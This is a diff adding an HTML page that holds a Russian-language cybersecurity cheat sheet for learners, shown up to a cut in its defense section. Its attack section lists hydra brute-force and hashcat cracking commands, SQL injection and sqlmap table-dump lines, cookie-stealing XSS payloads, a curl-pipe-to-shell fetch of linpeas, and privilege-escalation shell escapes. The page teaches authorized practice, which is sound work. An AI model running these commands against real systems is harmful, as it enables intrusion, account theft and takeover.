@@ -1,0 +1,1101 @@
+<!DOCTYPE html>
+<html lang="ru" data-theme="dark">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CyberSec Cheat Sheet — шпаргалка по кибербезопасности</title>
+  <meta name="description"
+    content="Практичная одностраничная памятка по кибербезопасности: Linux, разведка, атака, защита, one-liners и песочница.">
+  <link rel="icon"
+    href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%235b8cff' d='M12 2l8 3v6c0 5-3.4 9.4-8 11-4.6-1.6-8-6-8-11V5z'/%3E%3C/svg%3E">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <header class="site-header">
+    <button id="burgerBtn" class="icon-btn" title="Меню" aria-label="Открыть меню">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M3 6h18M3 12h18M3 18h18" />
+      </svg>
+    </button>
+    <a class="logo" href="#howto">
+      <svg width="26" height="26" viewBox="0 0 24 24">
+        <path fill="var(--accent)" d="M12 2l8 3v6c0 5-3.4 9.4-8 11-4.6-1.6-8-6-8-11V5z" />
+        <path fill="none" stroke="#fff" stroke-width="1.6" d="M8.5 12l2.5 2.5 4.5-5" />
+      </svg>
+      CyberSec Cheat Sheet <span class="ver">v1.0</span>
+    </a>
+    <div class="search-wrap">
+      <span class="s-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+          stroke-width="2">
+          <circle cx="11" cy="11" r="7" />
+          <path d="M21 21l-4.3-4.3" />
+        </svg></span>
+      <input id="searchInput" type="text" placeholder="Поиск по памятке: команды, разделы, теги…" autocomplete="off">
+      <span class="search-hint"><kbd>/</kbd><kbd>Ctrl K</kbd></span>
+    </div>
+    <button id="filterChip" class="filter-chip" title="Сбросить фильтр по тегу"></button>
+    <span id="searchStatus" class="search-status"></span>
+    <button id="themeBtn" class="icon-btn" title="Переключить тему" aria-label="Тема">
+      <svg id="iconMoon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z" />
+      </svg>
+      <svg id="iconSun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none">
+        <circle cx="12" cy="12" r="4" />
+        <path d="M12 2v2m0 16v2M4.9 4.9l1.4 1.4m11.4 11.4 1.4 1.4M2 12h2m16 0h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4" />
+      </svg>
+    </button>
+    <button id="favBtn" class="icon-btn" title="Избранное" aria-label="Избранное">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M12 3l2.7 5.6 6.1.9-4.4 4.3 1 6.1L12 17l-5.4 2.9 1-6.1L3.2 9.5l6.1-.9z" />
+      </svg>
+      <span class="badge hidden" id="favCount">0</span>
+    </button>
+  </header>
+
+  <div class="overlay" id="navOverlay"></div>
+  <div class="layout">
+    <nav class="sidenav" id="sidenav" aria-label="Разделы памятки">
+      <div class="nav-title">Карта памяти</div>
+      <a class="nav-link" href="#howto"><span class="nav-num">01</span>Как пользоваться / Карта местности</a>
+      <a class="nav-link" href="#roadmap"><span class="nav-num">02</span>Roadmap: куда развиваться</a>
+      <a class="nav-link" href="#linux"><span class="nav-num">03</span>Linux: файлы и система</a>
+      <a class="nav-link" href="#recon"><span class="nav-num">04</span>Разведка (Recon)</a>
+      <a class="nav-link" href="#attack"><span class="nav-num">05</span>Атака</a>
+      <a class="nav-link" href="#defense"><span class="nav-num">06</span>Защита и Hardening</a>
+      <a class="nav-link" href="#tools"><span class="nav-num">07</span>Полезные инструменты</a>
+      <a class="nav-link" href="#oneliners"><span class="nav-num">08</span>One-liners</a>
+      <a class="nav-link" href="#sandbox"><span class="nav-num">09</span>Песочница</a>
+      <a class="nav-link" href="#scenario"><span class="nav-num">10</span>Сквозной сценарий</a>
+      <a class="nav-link" href="#resources"><span class="nav-num">11</span>Литература и ресурсы</a>
+      <div class="nav-foot">Горячие клавиши: <kbd>/</kbd> или <kbd>Ctrl K</kbd> — поиск. Звёздочка на карточке — в
+        избранное.</div>
+    </nav>
+
+    <main id="mainContent">
+      <!--SEC-howto-->
+      <section class="block" id="howto">
+        <div class="sec-head"><span class="sec-num">01</span>
+          <h2 class="sec-title">Как пользоваться памяткой · Карта местности</h2>
+        </div>
+        <p class="sec-sub">Не зубри всё подряд. Начни с Linux, затем переходи к сетям — дальше разведка и атака/защита
+          уже «собираются» сами.</p>
+
+        <div class="legal">
+          <span class="co-title">⚠ Строгое предупреждение о легальности</span>
+          Памятка — учебный материал. Запуск атакующих команд против систем, которые тебе не принадлежат и на
+          тестирование которых нет письменного разрешения, — это преступление (в РФ — ст. 272/273 УК; в других
+          юрисдикциях — аналогичные нормы). Практикуйся только на своих машинах, виртуальных лабораториях или легальных
+          площадках: TryHackMe, Hack The Box, OWASP Juice Shop.
+        </div>
+
+        <div class="grid-2">
+          <div class="card">
+            <h3>Порядок чтения</h3>
+            <ul class="clean">
+              <li><b>Шаг 1.</b> Раздел «Linux» — доведи базовые команды до автоматизма (в песочнице, раздел 09).</li>
+              <li><b>Шаг 2.</b> «Roadmap» — выбери направление: Red Team, Blue Team или AppSec.</li>
+              <li><b>Шаг 3.</b> «Разведка» → «Атака» (если атакующий путь) или «Защита и Hardening» (если защитный).
+              </li>
+              <li><b>Шаг 4.</b> «Сквозной сценарий» — посмотри, как всё связывается в одну цепочку.</li>
+            </ul>
+          </div>
+          <div class="card">
+            <h3>Аналогия: замок</h3>
+            <ul class="clean">
+              <li><b>Замок</b> — сервер и инфраструктура (Linux, файлы, процессы).</li>
+              <li><b>Охрана у ворот</b> — firewall, fail2ban, IDS («Защита»).</li>
+              <li><b>Разведка стен</b> — recon: порты, сервисы, поддомены.</li>
+              <li><b>Меч</b> — инструменты атаки: брутфорс, SQLi, privesc.</li>
+              <li><b>Щит</b> — hardening: патчи, права доступа, аудит логов.</li>
+            </ul>
+          </div>
+        </div>
+
+        <h3 class="group-title" style="margin-top:8px">Мини-глоссарий</h3>
+        <div class="glossary">
+          <div class="term"><b>CVE</b> — уникальный номер уязвимости (Common Vulnerabilities and Exposures). Ищешь CVE →
+            ищешь патч или эксплойт. <a href="#resources">→ ресурсы</a></div>
+          <div class="term"><b>Payload</b> — полезная нагрузка: код/команда, которую атакующий доставляет жертве (shell,
+            скрипт). <a href="#attack">→ атака</a></div>
+          <div class="term"><b>Privilege Escalation</b> — повышение привилегий: из обычного пользователя до root/admin.
+            <a href="#privesc">→ privesc</a></div>
+          <div class="term"><b>Zero-day</b> — уязвимость, о которой вендор ещё не знает (или не выпустил патч). <a
+              href="#defense">→ защита</a></div>
+          <div class="term"><b>Phishing</b> — социальная инженерия: жертва сама «открывает дверь» по ссылке/письму. <a
+              href="#recon">→ разведка</a></div>
+          <div class="term"><b>C2 (Command &amp; Control)</b> — канал управления скомпрометированной машиной. <a
+              href="#scenario">→ сценарий</a></div>
+          <div class="term"><b>Lateral Movement</b> — горизонтальное перемещение атакующего внутри сети после первого
+            доступа. <a href="#scenario">→ сценарий</a></div>
+          <div class="term"><b>MITM (Man-in-the-Middle)</b> — перехват и подмена трафика между двумя сторонами. <a
+              href="#tools">→ инструменты</a></div>
+        </div>
+      </section>
+
+      <!--SEC-roadmap-->
+      <section class="block" id="roadmap">
+        <div class="sec-head"><span class="sec-num">02</span>
+          <h2 class="sec-title">Roadmap: что учить и куда развиваться</h2>
+        </div>
+        <p class="sec-sub">Три ступени. Первая — обязательна для всех, третья — выбор специализации.</p>
+
+        <div class="card roadmap-step" id="roadmap-1">
+          <div class="step-num">1</div>
+          <div style="flex:1">
+            <h3>База: Linux + сети</h3>
+            <ul class="clean">
+              <li><b>Linux:</b> файловая система, права (chmod/chown), процессы, пайплайны и grep. Без этого ни один
+                инструмент не «покажет».</li>
+              <li><b>Сети:</b> OSI/TCP-IP, IP/подсети/CIDR, DNS, HTTP(S), основные порты (22, 80, 443, 3306…).</li>
+              <li><b>Проверка себя:</b> объяснить вслух, как пакет доходит от браузера до сервера и что отвечает
+                firewall.</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="card roadmap-step" id="roadmap-2">
+          <div class="step-num">2</div>
+          <div style="flex:1">
+            <h3>Скриптинг: Bash + Python</h3>
+            <ul class="clean">
+              <li><b>Bash:</b> циклы, функции, обработка вывода команд — автоматизация рутины и парсинг логов.</li>
+              <li><b>Python:</b> <code>requests</code> (HTTP), <code>socket</code>/<code>scapy</code> (сети),
+                <code>paramiko</code> (SSH). Скрипт = твой личный инструмент под задачу.</li>
+              <li><b>Проверка себя:</b> написать скрипт, который сам сканирует порты и сохраняет результат в CSV.</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="card roadmap-step" id="roadmap-3">
+          <div class="step-num">3</div>
+          <div style="flex:1">
+            <h3>Выбор пути</h3>
+            <table class="simple">
+              <tr>
+                <th>Путь</th>
+                <th>Суть</th>
+                <th>Ключевые навыки и инструменты</th>
+              </tr>
+              <tr>
+                <td><b style="color:var(--red)">Red Team</b></td>
+                <td>Атакующий: находит уязвимости до злоумышленника</td>
+                <td>nmap, sqlmap, hydra, Metasploit, privesc; CTF (HTB, TryHackMe)</td>
+              </tr>
+              <tr>
+                <td><b style="color:var(--ok)">Blue Team</b></td>
+                <td>Защитник: видит атаки и реагирует</td>
+                <td>логи (journalctl), SIEM, fail2ban, hardening, анализ артефактов</td>
+              </tr>
+              <tr>
+                <td><b style="color:var(--accent2)">AppSec</b></td>
+                <td>Безопасность приложений на этапе разработки</td>
+                <td>OWASP Top 10, code review, SAST/DAST, безопасные паттерны</td>
+              </tr>
+            </table>
+          </div>
+        </div>
+
+        <div class="callout qa"><span class="co-title">Частый вопрос новичка</span>«С чего начать — с атак или защиты?»
+          С базы (шаг 1–2), затем выбери один путь и углубляйся в него. Прыгать сразу в Metasploit без понимания сетей —
+          как учить стрельбу, не зная, что такое прицел.</div>
+      </section>
+
+      <!--SEC-linux-->
+      <section class="block" id="linux">
+        <div class="sec-head"><span class="sec-num">03</span>
+          <h2 class="sec-title">Linux: файлы и система</h2>
+        </div>
+        <p class="sec-sub">Фундамент для всех остальных разделов. Терминал — это «руки» специалиста по безопасности.</p>
+
+        <div class="why-grid">
+          <div class="why-box"><span class="wb-title">Зачем это нужно (на пальцах)</span>Любая атака и защита начинается
+            с системы: файлы, права, процессы. Умение быстро читать систему = умение быстро находить следы.</div>
+          <div class="why-box"><span class="wb-title">Аналогия</span>Linux — как дом: каталоги — комнаты, права доступа
+            — замки на дверях, процессы — жильцы, которые сейчас в доме. grep/find — это поиск по дому с фонариком.
+          </div>
+          <div class="why-box warn"><span class="wb-title">Что будет, если проигнорировать</span>Инструменты (nmap,
+            hydra) будут «чёрным ящиком»: не поймёшь их вывод, не сможешь автоматизировать рутину и читать логи при
+            инциденте.</div>
+          <div class="why-box"><span class="wb-title">Самое важное</span>
+            <ul class="clean" style="margin:0">
+              <li>Пайплайн <code>|</code> — склейка команд.</li>
+              <li>Права rwx и chmod — основа контроля доступа.</li>
+              <li>grep/find — 80% повседневной работы.</li>
+            </ul>
+          </div>
+        </div>
+
+        <h3 class="group-title" style="margin-top:8px">Файлы и навигация</h3>
+
+        <article class="card cmd-card" id="cmd-ls" data-tags="linux files">
+          <div class="cmd-head">
+            <h3>ls — список файлов</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">ls -la
+ls -lah /var/log</pre>
+          <p class="cmd-note"><b>-l</b> — подробный вывод (права, владелец, размер), <b>-a</b> — включая скрытые,
+            <b>-h</b> — человекочитаемые размеры.</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="files">#files</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-cd" data-tags="linux files">
+          <div class="cmd-head">
+            <h3>cd — смена каталога</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">cd /var/log
+cd ..        # на уровень вверх
+cd ~          # в домашнюю директорию
+pwd           # где я сейчас</pre>
+          <p class="cmd-note"><b>/etc</b> — конфиги, <b>/var/log</b> — логи, <b>/tmp</b> — временные файлы (любимое
+            место атакующих), <b>/root</b> — домашний каталог root.</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="files">#files</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-cat" data-tags="linux files">
+          <div class="cmd-head">
+            <h3>cat / head / tail — чтение файлов</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">cat /etc/passwd
+head -n 20 access.log
+tail -f /var/log/auth.log   # следить за логом в реальном времени</pre>
+          <p class="cmd-note"><b>cat</b> — весь файл, <b>head/tail -n N</b> — первые/последние N строк, <b>-f</b> —
+            «хвост» в live-режиме (ключевая команда при мониторинге).</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="logs">#logs</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-grep" data-tags="linux files logs">
+          <div class="cmd-head">
+            <h3>grep — поиск по тексту</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">grep -i "error" app.log
+grep -rn "password" /etc/ 2&gt;/dev/null
+tail -f auth.log | grep --line-buffered "Failed password"</pre>
+          <p class="cmd-note"><b>-i</b> — без учёта регистра, <b>-r</b> — рекурсивно по каталогу, <b>-n</b> — номера
+            строк, <b>-E</b> — расширенные регулярки. <code>2&gt;/dev/null</code> — подавить ошибки «нет доступа».</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="logs">#logs</span></div>
+        </article>
+
+        <!--LINUX2-->
+        <article class="card cmd-card" id="cmd-find" data-tags="linux files privesc">
+          <div class="cmd-head">
+            <h3>find — поиск файлов по критериям</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">find /var/www -name "*.php"
+find . -mtime +7 -name "*.log"          # файлы старше 7 дней
+find / -perm -4000 -type f 2&gt;/dev/null   # SUID-бинарники (привет, privesc!)</pre>
+          <p class="cmd-note"><b>-name</b> — по имени (шаблоны), <b>-mtime +N</b> — по дате изменения, <b>-perm
+              -4000</b> — SUID-файлы. Классика разведки на скомпрометированной машине.</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="privesc">#privesc</span></div>
+        </article>
+
+        <h3 class="group-title">Права доступа и архивы</h3>
+
+        <article class="card cmd-card" id="cmd-chmod" data-tags="linux files">
+          <div class="cmd-head">
+            <h3>chmod — права доступа</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">chmod 755 script.sh     # rwxr-xr-x: владелец всё, остальные чтение+запуск
+chmod 644 config.txt    # rw-r--r-
+chmod +x exploit.py     # добавить право на запуск</pre>
+          <p class="cmd-note">Цифра = сумма прав: r=4, w=2, x=1. Три тройки — владелец / группа / остальные. Ошибка в
+            правах (например, 777) — частая причина инцидентов.</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="hardening">#hardening</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-tar" data-tags="linux files">
+          <div class="cmd-head">
+            <h3>tar — архивация</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">tar -czvf backup.tar.gz /var/www     # создать gzip-архив
+tar -xzvf backup.tar.gz              # распаковать
+tar -tzf backup.tar.gz               # только список содержимого</pre>
+          <p class="cmd-note"><b>c</b> — create, <b>x</b> — extract, <b>t</b> — list, <b>z</b> — gzip, <b>v</b> —
+            verbose, <b>f</b> — имя файла (всегда в конце).</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="files">#files</span></div>
+        </article>
+
+        <h3 class="group-title">Процессы и сеть</h3>
+
+        <article class="card cmd-card" id="cmd-ps-top" data-tags="linux processes">
+          <div class="cmd-head">
+            <h3>ps / top — процессы</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">ps aux | grep sshd
+ps aux --sort=-%cpu | head -n 10   # топ по CPU
+top                                # интерактивно (q — выход)
+top -c                             # полные командные строки</pre>
+          <p class="cmd-note"><b>a</b> — все процессы, <b>u</b> — ориентация на пользователя. Ищешь подозрительный
+            процесс? Смотри PID, владельца и полный путь: <code>ls -l /proc/&lt;PID&gt;/exe</code>.</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="processes">#processes</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-ss" data-tags="linux network processes">
+          <div class="cmd-head">
+            <h3>ss / netstat — сокеты и порты</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">ss -tulnp                 # слушающие TCP/UDP-порты + процессы
+netstat -tulpn            # тот же смысл (старая утилита)
+ss -tnp state established | head   # активные соединения</pre>
+          <p class="cmd-note"><b>t</b>/u — tcp/udp, <b>l</b> — listening, <b>n</b> — без резолва имён, <b>p</b> —
+            процессы (полный список — от root). Ответ на вопрос «что вообще слушает этот сервер?».</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="network">#network</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-lsof" data-tags="linux network processes">
+          <div class="cmd-head">
+            <h3>lsof — кто открыл файл/порт</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">lsof -i :443              # кто слушает порт 443
+lsof -p 1234              # все файлы процесса с PID 1234
+lsof +D /var/www          # всё открытое в каталоге</pre>
+          <p class="cmd-note">«LISt OF Open Files». Незаменим при расследовании: какой процесс держит подозрительное
+            соединение или файл.</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="network">#network</span></div>
+        </article>
+
+        <div class="callout qa"><span class="co-title">Частый вопрос новичка</span>«Зачем учить команды, если есть GUI?»
+          В продакшене и на скомпрометированных машинах GUI часто нет — только SSH-терминал. Скорость в терминале =
+          скорость реакции при инциденте.</div>
+        <div class="callout err"><span class="co-title">Типичная ошибка</span>Запускать <code>find / …</code> или
+          <code>grep -r … /etc</code> без <code>2&gt;/dev/null</code> и без понимания, что рекурсивный поиск по всей
+          системе — медленно и может «загрузить» сервер. Сначала сужай каталог.</div>
+      </section>
+
+      <!--SEC-recon-->
+      <section class="block" id="recon">
+        <div class="sec-head"><span class="sec-num">04</span>
+          <h2 class="sec-title">Разведка (Recon)</h2>
+        </div>
+        <p class="sec-sub">Собери максимум информации до первого шага атаки. Хороший recon экономит часы и оставляет
+          меньше следов.</p>
+
+        <div class="why-grid">
+          <div class="why-box"><span class="wb-title">Зачем это нужно (на пальцах)</span>Прежде чем лезть в дом, смотри:
+            где окна, какие замки, кто живёт. Recon = карта целей: порты, сервисы, версии, поддомены, люди.</div>
+          <div class="why-box"><span class="wb-title">Аналогия</span>Шпион перед операцией изучает расписание охраны.
+            Разведчик перед атакой изучает поверхность атаки (attack surface) жертвы.</div>
+          <div class="why-box warn"><span class="wb-title">Что будет, если проигнорировать</span>Слепая атака:
+            медленнее, громче (триггерит IDS), чаще упирается в «не то» место. 80% успеха — в данных, собранных до
+            первого пакета.</div>
+          <div class="why-box"><span class="wb-title">Самое важное</span>
+            <ul class="clean" style="margin:0">
+              <li>Пассивный recon (dig, whois) не трогает цель.</li>
+              <li>nmap — скелет любого сканирования.</li>
+              <li>Версии сервисов = ключ к эксплойтам.</li>
+            </ul>
+          </div>
+        </div>
+
+        <article class="card cmd-card" id="cmd-nmap" data-tags="recon network">
+          <div class="cmd-head">
+            <h3>nmap — сканирование портов и сервисов</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">nmap target_ip                          # топ-1000 TCP-портов
+nmap -sV -sC target_ip                  # версии сервисов + дефолтные NSE-скрипты
+nmap -p- --min-rate=5000 target_ip      # все 65535 портов, быстро
+nmap -O target_ip                       # определение ОС (точнее от root)</pre>
+          <p class="cmd-note"><b>-sV</b> — версия сервиса, <b>-sC</b> — дефолтные скрипты NSE, <b>-p-</b> — все порты,
+            <b>-O</b> — OS fingerprinting. Результат: что открыто и какие версии.</p>
+          <div class="tags"><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link"
+              data-tag="network">#network</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-gobuster" data-tags="recon web">
+          <div class="cmd-head">
+            <h3>gobuster / ffuf — перебор директорий и имён</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
+ffuf -u http://target/FUZZ -w wordlist.txt          # FUZZ — маркер подстановки
+gobuster vhost -u http://target -w subdomains-top1000.txt</pre>
+          <p class="cmd-note">Ищет «двери», которые не указаны в меню сайта: /admin, /backup, /.git. ffuf быстрее и
+            гибче (поддерживает JSON-ответы, заголовки).</p>
+          <div class="tags"><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link"
+              data-tag="web">#web</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-dig-whois" data-tags="recon network osint">
+          <div class="cmd-head">
+            <h3>dig / whois — пассивная разведка DNS и домена</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">dig example.com A +short          # IP-адрес
+dig @8.8.8.8 example.com MX       # почтовые серверы (через чужой DNS)
+dig example.com TXT               # SPF / DMARC / DKIM
+whois example.com                 # регистратор, даты, администратор</pre>
+          <p class="cmd-note">Пассивный recon: цель ничего не видит. MX-записи часто раскрывают инфраструктуру (почта,
+            CRM), TXT — настройки аутентификации почты.</p>
+          <div class="tags"><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link"
+              data-tag="osint">#osint</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-masscan-subfinder" data-tags="recon network osint">
+          <div class="cmd-head">
+            <h3>masscan / subfinder — масштабная разведка</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">masscan 10.0.0.0/24 -p80,443 --rate=5000   # быстрый скан целой подсети
+subfinder -d example.com                   # пассивный поиск поддоменов</pre>
+          <p class="cmd-note">masscan — на порядки быстрее nmap (для широких диапазонов; точность ниже). subfinder
+            собирает поддомены из публичных источников без обращения к цели.</p>
+          <div class="tags"><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link"
+              data-tag="osint">#osint</span></div>
+        </article>
+
+        <div class="callout qa"><span class="co-title">Частый вопрос новичка</span>«nmap или masscan?» Для одной-двух
+          целей — nmap (точнее, скрипты). Для целой подсети/облака — сначала masscan по ключевым портам, затем nmap -sV
+          только на найденных хостах.</div>
+        <div class="callout err"><span class="co-title">Типичная ошибка</span>Сканировать чужие IP «просто посмотреть».
+          Даже пассивный nmap виден в логах цели. Разрешение (scope) — до первого пакета, а не после.</div>
+      </section>
+
+      <!--SEC-attack-->
+      <section class="block" id="attack">
+        <div class="sec-head"><span class="sec-num">05</span>
+          <h2 class="sec-title">Атака</h2>
+        </div>
+        <p class="sec-sub">Только на разрешённых целях: свои машины, лабы, CTF. Порядок: доступ → закрепление →
+          повышение привилегий.</p>
+
+        <div class="why-grid">
+          <div class="why-box"><span class="wb-title">Зачем это нужно (на пальцах)</span>Атака — проверка защиты: если
+            ты можешь войти, сможет и злоумышленник. Понимание атак = понимание, что защищать.</div>
+          <div class="why-box"><span class="wb-title">Аналогия</span>Меч в руках мастера: сначала подберёшь замок
+            (брутфорс), потом найдёшь окно (веб-уязвимость), и только после этого — залезешь на второй этаж (privesc).
+          </div>
+          <div class="why-box warn"><span class="wb-title">Что будет, если проигнорировать</span>Защитник без понимания
+            атак ставит «замок» там, где злоумышленник войдёт через окно. Атакующий без базы не отличит уязвимость от
+            шума.</div>
+          <div class="why-box"><span class="wb-title">Самое важное</span>
+            <ul class="clean" style="margin:0">
+              <li>Брутфорс бьёт по слабым паролям — корень большинства инцидентов.</li>
+              <li>SQLi/XSS — топ веб-уязвимостей (OWASP).</li>
+              <li>Privesc превращает «доступ» в «контроль».</li>
+            </ul>
+          </div>
+        </div>
+
+        <article class="card cmd-card" id="cmd-hydra" data-tags="attack brute-force">
+          <div class="cmd-head">
+            <h3>hydra — брутфорс сетевых сервисов</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">hydra -L users.txt -P pass.txt ssh://target_ip
+hydra -l admin -P pass.txt target_ip http-post-form "/login:u=^USER^&p=^PASS^:F=incorrect"
+hydra -t 4 -w 10 -V ftp://target_ip</pre>
+          <p class="cmd-note"><b>-L/-P</b> — списки логин/паролей, <b>-l</b> — один логин, <b>-t</b> — потоки, <b>-w</b>
+            — задержка (тише = незаметнее). http-post-form: <code>F=</code> — маркер «неудачного» ответа.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="brute-force">#brute-force</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-hashcat" data-tags="attack brute-force">
+          <div class="cmd-head">
+            <h3>hashcat — взлом хэшей паролей</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">hashcat -m 0 -a 0 hashes.txt rockyou.txt      # md5, прямой перебор
+hashcat -m 1800 -a 0 sha512_hashes.txt rockyou.txt   # bcrypt (медленнее)
+hashcat -m 100 -a 0 nt.hashes rockyou.txt     # NTLM (Windows)</pre>
+          <p class="cmd-note"><b>-m</b> — тип хэша, <b>-a</b> — режим атаки (0 — словарь, 3 — маска). Если у тебя есть
+            дамп БД или /etc/shadow — hashcat решает всё остальное. GPU ускоряет в десятки раз.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="brute-force">#brute-force</span></div>
+        </article>
+
+        <!--ATTACK2-->
+        <article class="card cmd-card" id="cmd-sqli" data-tags="attack web">
+          <div class="cmd-head">
+            <h3>SQLi — SQL-инъекции</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># Классические тесты (в полях формы / GET-параметрах):
+' OR 1=1 --
+" OR ""="
+) OR 1=1 #
+
+# Автоматизация:
+sqlmap -u "http://target/page?id=1" --dbs
+sqlmap -u "http://target/page?id=1" -D shop -T users --dump</pre>
+          <p class="cmd-note">Суть: пользовательский ввод попадает в SQL-запрос без экранирования. Признаки: ошибки БД,
+            асимметрия ответов на «/». Защита: prepared statements (параметризованные запросы) — всегда.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="web">#web</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-xss" data-tags="attack web">
+          <div class="cmd-head">
+            <h3>XSS — кросс-сайтовый скриптинг</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;</pre>
+          <p class="cmd-note">Скрипт выполняется в браузере жертвы: кража cookie, сессий, фишинг внутри доверенного
+            сайта. Защита: экранирование вывода (context-aware encoding), CSP-заголовки.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="web">#web</span></div>
+        </article>
+
+        <h3 class="group-title">Privilege Escalation — повышение привилегий</h3>
+
+        <article class="card cmd-card" id="privesc" data-tags="attack privesc linux">
+          <div class="cmd-head">
+            <h3>linpeas / linenum — автоматический аудит Linux</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+./linpeas.sh -a          # полный аудит: SUID, sudo, cron, ядро, контейнеры</pre>
+          <p class="cmd-note">Скрипт сам проверяет десятки векторов и подсказывает, что попробовать. Результат — список
+            «возможных путей» до root.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="privesc">#privesc</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-privesc-manual" data-tags="attack privesc linux">
+          <div class="cmd-head">
+            <h3>Ручные проверки (то, что ищет linpeas)</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">sudo -l                          # какие команды можно запускать от sudo?
+find / -perm -4000 2&gt;/dev/null   # SUID-бинарники (vim, find, nmap → root)
+cat /etc/crontab; ls /etc/cron*  # cron: кто и что запускает с правами root
+ls -la /var/backups/             # бэкапы БД с паролями в открытом виде
+id                               # кто я? какие группы? (docker = почти root)
+uname -a                         # версия ядра → CVE по LPE-базам</pre>
+          <p class="cmd-note">Классика: <code>sudo vim</code> → <code>:!/bin/sh</code>; SUID на <code>find</code> →
+            <code>find / -exec /bin/sh \; -quit</code>; доступ к группе <code>docker</code> → контейнер с монтированным
+            <code>/</code>.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="privesc">#privesc</span></div>
+        </article>
+
+        <div class="callout qa"><span class="co-title">Частый вопрос новичка</span>«Почему не сразу sqlmap на всё
+          подряд?» Инструмент без понимания уязвимости даёт шум: ложные срабатывания, бан IP, сработавший WAF. Сначала
+          ручной тест (одна инъекция), потом автоматизация.</div>
+        <div class="callout err"><span class="co-title">Типичная ошибка</span>Останавливаться на первом доступе: shell
+          обычного пользователя — это не победа. Цель атаки почти всегда выше: root, данные, домен-контроллер. Privesc —
+          обязательный шаг.</div>
+      </section>
+
+      <!--SEC-defense-->
+      <section class="block" id="defense">
+        <div class="sec-head"><span class="sec-num">06</span>
+          <h2 class="sec-title">Защита и Hardening</h2>
+        </div>
+        <p class="sec-sub">Защитник думает как атакующий: закрывает не «то, что удобно», а то, что реально
